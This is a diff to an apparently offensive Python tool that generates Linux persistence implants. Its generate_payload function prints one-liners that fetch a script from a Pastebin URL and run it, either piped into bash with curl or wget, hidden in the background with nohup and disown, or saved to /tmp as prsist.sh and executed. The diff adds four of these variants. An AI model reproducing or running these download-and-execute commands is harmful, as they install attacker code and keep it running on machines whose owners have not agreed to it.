@@ -40,6 +40,10 @@ def generate_payload(implant_url):
 	info(f"Pastebin URL: {pastebin_url}")
 	success(f"timeout 30 curl -sSL {pastebin_url}|bash")
 	success(f"nohup bash -c 'curl -sSL {pastebin_url}|bash' &>/dev/null & disown")
+	success(f"cd /tmp;curl -sSLo prsist.sh {pastebin_url};chmod +x prsist.sh;./prsist.sh\n")
+	success(f"timeout 30 wget -qO- {pastebin_url}|bash")
+	success(f"nohup bash -c 'wget -qO- {pastebin_url}|bash' &>/dev/null & disown")
+	success(f"cd /tmp;wget -qO prsist.sh {pastebin_url};chmod +x prsist.sh;./prsist.sh")
 
 def main():
 	parser = argparse.ArgumentParser(description="Generates a Linux persistence implant script to deploy quickly.")
